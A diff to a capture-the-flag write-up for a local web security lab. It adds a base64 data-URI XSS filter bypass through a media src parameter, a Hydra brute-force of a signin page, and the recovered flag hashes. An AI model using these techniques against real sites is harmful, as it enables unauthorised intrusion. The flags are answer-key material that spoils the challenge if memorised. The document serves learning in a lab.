@@ -217,11 +217,35 @@ crafting the curl command and doing a diff :
 > <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
 ```
 
-### Flag 05 (WIP)
+### Flag 05 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
 
 a weirdly loaded image http://localhost:13080/index.php?page=media&src=1
 
-### Flag 06 (WIP)
+after trying a million things
+
+we can bypass the url encoding with base 64, and do an xss attack
+
+```
+➜  darklyProject git:(master) ✗ echo '<script>alert()</script>' | base64
+PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+Cg==
+```
+
+this gives us a double wrong answer as http://localhost:8080/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+Cg==
+
+but putting something in the alert
+
+```
+➜  darklyProject git:(master) ✗ echo '<script>alert("ok")</script>' | base64
+PHNjcmlwdD5hbGVydCgib2siKTwvc2NyaXB0Pgo=
+```
+
+gets us the flag
+
+```
+ The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
+```
+
+### Flag 06 b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
 
 intuition is last flag is probably signin page
 let's try and bruteforce the password
@@ -267,7 +291,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-29 13:40:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-29 13:48:49
 ```
 
-not very secure hm, using either any user with shadow as password leads to : "The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 " !
+not very secure hm, using any user with shadow as password leads to : "The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 " !
 
 ### Flag 07 df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
 
